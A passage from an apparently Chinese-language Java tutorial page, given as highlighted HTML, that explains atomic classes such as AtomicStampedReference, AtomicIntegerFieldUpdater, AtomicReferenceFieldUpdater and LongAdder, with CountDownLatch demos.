class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        countDownLatch<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>myNumber<span class="token punctuation">.</span><span class="token function">getAtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="扩展知识CountDownLatch"><a href="#扩展知识CountDownLatch" class="headerlink" title="扩展知识CountDownLatch"></a>扩展知识CountDownLatch</h4><p>它是一个同步工具类，允许一个或多个线程一直等待，直到其他线程运行完成后再执行。</p><p>使用场景：</p><ul><li><p>场景1：让多个线程等待</p><p>  多个线程awit()的时候，等待某个线程调用countDown来触发</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">CountDownLatch</span> countDownLatch <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//准备完毕……运动员都阻塞在这，等待号令</span>            countDownLatch<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> parter <span class="token operator">=</span> <span class="token string">"【"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】"</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>parter <span class="token operator">+</span> <span class="token string">"开始执行……"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 裁判准备发令</span>countDownLatch<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 发令枪：执行发令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure></li><li><p>场景2：和让单个线程等待</p><p>​多线程执行任务的同时，主线程等待多线程执行完成后，再在主线程得到数据，上面的AtomicIntegerDemo就是这种场景</p></li></ul><h3 id="AtomicBoolean"><a href="#AtomicBoolean" class="headerlink" title="AtomicBoolean"></a>AtomicBoolean</h3><p>原子更新布尔类型，用法类似</p><h3 id="AtomicLong"><a href="#AtomicLong" class="headerlink" title="AtomicLong"></a>AtomicLong</h3><p>原子更新长整型，用法类似</p><h2 id="原子更新数组"><a href="#原子更新数组" class="headerlink" title="原子更新数组"></a>原子更新数组</h2><h3 id="AtomicIntegerArray"><a href="#AtomicIntegerArray" class="headerlink" title="AtomicIntegerArray"></a>AtomicIntegerArray</h3><p>原子更新整型数组里的元素。</p><h3 id="AtomicLongArray"><a href="#AtomicLongArray" class="headerlink" title="AtomicLongArray"></a>AtomicLongArray</h3><p>原子更新长整型数组里的元素。</p><h3 id="AtomicReferenceArray"><a href="#AtomicReferenceArray" class="headerlink" title="AtomicReferenceArray"></a>AtomicReferenceArray</h3><p>原子更新引用类型数组里的元素。</p><h2 id="引用类型原子类"><a href="#引用类型原子类" class="headerlink" title="引用类型原子类"></a>引用类型原子类</h2><blockquote><p>上一章节讲到的ABA问题，这里就使用AtomicStampedReference和AtomicMarkableReference解决</p></blockquote><h3 id="AtomicReference"><a href="#AtomicReference" class="headerlink" title="AtomicReference"></a>AtomicReference</h3><p>原子更新引用类型,通过CAS原理调用compareAndSet</p><h3 id="AtomicStampedReference"><a href="#AtomicStampedReference" class="headerlink" title="AtomicStampedReference"></a>AtomicStampedReference</h3><p>原子更新引用类型, 内部使用Pair来存储元素值及其版本号，携带<code>版本号</code>的引用类型原子类，解决修改过几次</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicStampedReference</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/21 * @description: */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AtomicStampedReferenceDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token class-name">AtomicStampedReference</span> atomicStampedReference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicStampedReference</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"操作线程"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",初始值 a = "</span> <span class="token operator">+</span> atomicStampedReference<span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> stamp <span class="token operator">=</span> atomicStampedReference<span class="token punctuation">.</span><span class="token function">getStamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取当前标识别</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//等待1秒 ，以便让干扰线程执行</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">boolean</span> isCASSuccess <span class="token operator">=</span> atomicStampedReference<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> stamp<span class="token punctuation">,</span> stamp <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//此时expectedReference未发生改变，但是stamp已经被修改了,所以CAS失败</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"操作线程"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",CAS操作结果: "</span> <span class="token operator">+</span> isCASSuccess<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"t1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token keyword">yield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 确保thread-main 优先执行</span>            atomicStampedReference<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> atomicStampedReference<span class="token punctuation">.</span><span class="token function">getStamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> atomicStampedReference<span class="token punctuation">.</span><span class="token function">getStamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"操作线程"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",【increment】 ,值 = "</span> <span class="token operator">+</span> atomicStampedReference<span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            atomicStampedReference<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> atomicStampedReference<span class="token punctuation">.</span><span class="token function">getStamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> atomicStampedReference<span class="token punctuation">.</span><span class="token function">getStamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"操作线程"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",【decrement】 ,值 = "</span> <span class="token operator">+</span> atomicStampedReference<span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"t2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="AtomicMarkableReference"><a href="#AtomicMarkableReference" class="headerlink" title="AtomicMarkableReference"></a>AtomicMarkableReference</h3><p>原子更新带有标记位的引用类型，原子更新带有<code>标记位</code>的引用类型对象，解决是否修改过</p><h2 id="对象的属性修改原子类"><a href="#对象的属性修改原子类" class="headerlink" title="对象的属性修改原子类"></a>对象的属性修改原子类</h2><blockquote><p>以一种线程安全的方式操作非线程安全对象内的某些字段</p></blockquote><h3 id="使用要求-重点"><a href="#使用要求-重点" class="headerlink" title="使用要求(重点)"></a>使用要求(重点)</h3><p>1、更新的对象属性必须使用 public <code>volatile</code> 修饰符</p><p>2、因为对象的属性修改类型原子类都是抽象类，所以每次使用都必须<br>使用静态方法newUpdater()创建一个更新器，并且需要设置想要更新的类和属性。</p><h3 id="AtomicIntegerFieldUpdater"><a href="#AtomicIntegerFieldUpdater" class="headerlink" title="AtomicIntegerFieldUpdater"></a>AtomicIntegerFieldUpdater</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicIntegerFieldUpdater</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/21 * @description: */</span><span class="token keyword">class</span> <span class="token class-name">BankAccount</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> bankName <span class="token operator">=</span> <span class="token string">"ZG"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">volatile</span> <span class="token keyword">int</span> money <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">AtomicIntegerFieldUpdater</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BankAccount</span><span class="token punctuation">></span></span> accountAtomicIntegerFieldUpdater <span class="token operator">=</span> <span class="token class-name">AtomicIntegerFieldUpdater</span><span class="token punctuation">.</span><span class="token function">newUpdater</span><span class="token punctuation">(</span><span class="token class-name">BankAccount</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token string">"money"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//不加锁+性能高，局部微创</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transferMoney</span><span class="token punctuation">(</span><span class="token class-name">BankAccount</span> bankAccount<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        accountAtomicIntegerFieldUpdater<span class="token punctuation">.</span><span class="token function">incrementAndGet</span><span class="token punctuation">(</span>bankAccount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AtomicIntegerFieldUpdaterDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">BankAccount</span> bankAccount <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BankAccount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span><span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> finalI <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>                bankAccount<span class="token punctuation">.</span><span class="token function">transferMoney</span><span class="token punctuation">(</span>bankAccount<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//暂停毫秒</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">MILLISECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>bankAccount<span class="token punctuation">.</span>money<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="AtomicLongFieldUpdater"><a href="#AtomicLongFieldUpdater" class="headerlink" title="AtomicLongFieldUpdater"></a>AtomicLongFieldUpdater</h3><h3 id="AtomicReferenceFieldUpdater"><a href="#AtomicReferenceFieldUpdater" class="headerlink" title="AtomicReferenceFieldUpdater"></a>AtomicReferenceFieldUpdater</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicReferenceFieldUpdater</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/21 * @description: */</span><span class="token keyword">class</span> <span class="token class-name">MyVar</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">volatile</span> <span class="token class-name">Boolean</span> isInit <span class="token operator">=</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token constant">FALSE</span><span class="token punctuation">;</span>    <span class="token class-name">AtomicReferenceFieldUpdater</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">MyVar</span><span class="token punctuation">,</span><span class="token class-name">Boolean</span><span class="token punctuation">></span></span> atomicReferenceFieldUpdater <span class="token operator">=</span> <span class="token class-name">AtomicReferenceFieldUpdater</span><span class="token punctuation">.</span><span class="token function">newUpdater</span><span class="token punctuation">(</span><span class="token class-name">MyVar</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token string">"isInit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">MyVar</span> myVar<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>atomicReferenceFieldUpdater<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span>myVar<span class="token punctuation">,</span><span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token constant">FALSE</span><span class="token punctuation">,</span><span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token constant">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\t"</span><span class="token operator">+</span><span class="token string">"---init....."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//暂停几秒钟线程</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\t"</span><span class="token operator">+</span><span class="token string">"---init.....over"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\t"</span><span class="token operator">+</span><span class="token string">"------其它线程正在初始化"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AtomicReferenceFieldUpdaterDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">MyVar</span> myVar <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyVar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>                myVar<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>myVar<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="原子操作增强类"><a href="#原子操作增强类" class="headerlink" title="原子操作增强类"></a>原子操作增强类</h2><ul><li>DoubleAccumulator</li><li>DoubleAdder</li><li>LongAccumulator</li><li>LongAdder</li></ul><blockquote><p>  Adder和Accumulator区别：Adder只能用来计算加法，且从零开始计算；Accumulator提供了自定义的函数操作</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">LongAccumulator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">LongAdder</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/22 * @description: */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LongAdderDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">LongAdder</span> longAdder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LongAdder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        longAdder<span class="token 